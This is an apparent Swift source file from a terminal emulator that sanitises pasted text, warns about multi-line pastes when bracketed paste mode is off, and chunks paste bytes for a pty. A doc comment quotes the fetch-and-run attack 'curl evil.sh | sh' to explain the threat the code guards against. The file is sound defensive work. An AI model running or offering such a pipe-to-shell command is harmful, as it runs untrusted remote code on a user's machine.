import Foundation

/// Sanitises and wraps pasted text before it reaches the child's stdin.
///
/// `SECURITY.md` §2.3: "a paste is data, never a command stream." Strip ESC
/// and the other C0 control characters, and warn before sending a paste that
/// contains a newline when the application has not enabled bracketed paste —
/// without `?2004`, a pasted newline executes the line as if typed, which is
/// the classic "copy from a web page, run `curl evil.sh | sh`" attack.
///
/// `nonisolated`: pure functions over a value, with no AppKit in them — the
/// app target's MainActor default would only make them untestable.
nonisolated enum Paste {
    /// `ESC [ 200 ~` / `ESC [ 201 ~`, the bracketed-paste (?2004) markers.
    private static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
    private static let bracketEnd: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]

    /// Strips ESC and every other C0 control character from `text`, except
    /// the three a pasted document legitimately contains: tab, LF and CR
    /// (multi-line code and indented text are normal pastes; the newline
    /// warning, not stripping, is what guards them).
    static func sanitized(_ text: String) -> String {
        String(String.UnicodeScalarView(text.unicodeScalars.filter { scalar in
            scalar.value >= 0x20 || scalar == "\t" || scalar == "\n" || scalar == "\r"
        }))
    }

    /// Whether sending this paste without confirmation risks immediate
    /// execution: it contains a newline (LF or CR — both run the line) and
    /// the application has not enabled bracketed paste mode.
    static func needsWarning(text: String, bracketedPasteEnabled: Bool) -> Bool {
        !bracketedPasteEnabled && (text.contains("\n") || text.contains("\r"))
    }

    /// The bytes to write to the child for an already-sanitised paste. In
    /// bracketed mode the payload is wrapped in the ?2004 markers so the
    /// application treats it as data, not keystrokes.
    static func bytes(for text: String, bracketedPasteEnabled: Bool) -> [UInt8] {
        let payload = Array(text.utf8)
        guard bracketedPasteEnabled else { return payload }
        return bracketStart + payload + bracketEnd
    }

    /// B03: how large a piece of an already-wrapped paste one
    /// `TerminalSession.write` call carries. Splitting the write, not the
    /// bytes sent — the child sees the identical, unbroken byte stream
    /// either way, since separate writes to the same pty concatenate on the
    /// read side. What chunking buys is bounded latency for input typed
    /// mid-paste: it shares `TerminalSession`'s one FIFO queue with keyboard
    /// bytes, so a keystroke enqueued between two chunks is only ever
    /// behind one chunk's `write(2)`, not the whole paste. 64 KiB matches
    /// the reader's own read granularity (`TerminalSession.readChunkSize`).
    static let defaultChunkSize = 64 * 1024

    /// Splits `bytes` into pieces of at most `maxChunkSize`, preserving
    /// order. An empty input yields no chunks (nothing to enqueue); a
    /// non-positive `maxChunkSize` yields one chunk holding everything
    /// rather than looping forever.
    static func chunked(_ bytes: [UInt8], maxChunkSize: Int = defaultChunkSize) -> [[UInt8]] {
        guard !bytes.isEmpty else { return [] }
        guard maxChunkSize > 0 else { return [bytes] }
        var chunks: [[UInt8]] = []
        chunks.reserveCapacity((bytes.count + maxChunkSize - 1) / maxChunkSize)
        var offset = 0
        while offset < bytes.count {
            let end = min(offset + maxChunkSize, bytes.count)
            chunks.append(Array(bytes[offset..<end]))
            offset = end
        }
        return chunks
    }
}
